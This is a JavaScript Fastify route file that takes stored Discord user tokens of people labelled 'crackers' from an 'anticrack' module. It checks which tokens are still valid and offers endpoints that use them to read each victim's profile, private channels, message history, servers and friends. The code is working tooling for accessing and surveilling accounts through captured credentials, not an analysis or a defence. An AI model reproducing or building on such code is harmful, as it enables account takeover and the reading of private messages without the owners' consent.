const { discordFetch } = require('../lib/discord');
const { getCrackers, getCrackerById } = require('../lib/anticrack');

async function discordRoutes(fastify) {
  async function validateToken(token) {
    try {
      const user = await discordFetch(token, '/users/@me');
      return { valid: true, user };
    } catch { return { valid: false }; }
  }

  fastify.get('/validate', async (req) => {
    const { id, page = 1, limit = 50, search = '' } = req.query;
    if (id) {
      const cracker = await getCrackerById(parseInt(id));
      if (!cracker || !cracker.discord_token) return { valid: false };
      const { valid, user } = await validateToken(cracker.discord_token);
      return { valid, user: user || null };
    }
    const data = await getCrackers(parseInt(page), Math.min(parseInt(limit), 100), search);
    const validated = await Promise.all(data.crackers.map(async (c) => {
      if (!c.discord_token) return { ...c, token_valid: false, discord_profile: null };
      const { valid, user } = await validateToken(c.discord_token);
      return { ...c, token_valid: valid, discord_profile: user || null };
    }));
    return { crackers: validated.filter(c => c.token_valid), total: validated.filter(c => c.token_valid).length, page: data.page, limit: data.limit, pages: 1 };
  });

  fastify.get('/user', async (req) => {
    const { id } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) throw { statusCode: 404, message: 'No token' };
    const user = await discordFetch(cracker.discord_token, '/users/@me');
    return user;
  });

  fastify.get('/channels', async (req) => {
    const { id } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) throw { statusCode: 404, message: 'No token' };
    const channels = await discordFetch(cracker.discord_token, '/users/@me/channels');
    return channels.filter(c => c.type === 1 || c.type === 3);
  });

  fastify.get('/messages', async (req) => {
    const { id, channel_id, before, limit = 50 } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) throw { statusCode: 404, message: 'No token' };
    const params = new URLSearchParams({ limit });
    if (before) params.set('before', before);
    const msgs = await discordFetch(cracker.discord_token, `/channels/${channel_id}/messages?${params}`);
    return msgs;
  });

  fastify.get('/guilds', async (req) => {
    const { id } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) throw { statusCode: 404, message: 'No token' };
    return discordFetch(cracker.discord_token, '/users/@me/guilds');
  });

  fastify.get('/friends', async (req) => {
    const { id } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) throw { statusCode: 404, message: 'No token' };
    try {
      const friends = await discordFetch(cracker.discord_token, '/users/@me/relationships');
      return friends;
    } catch { return []; }
  });
}

module.exports = discordRoutes;
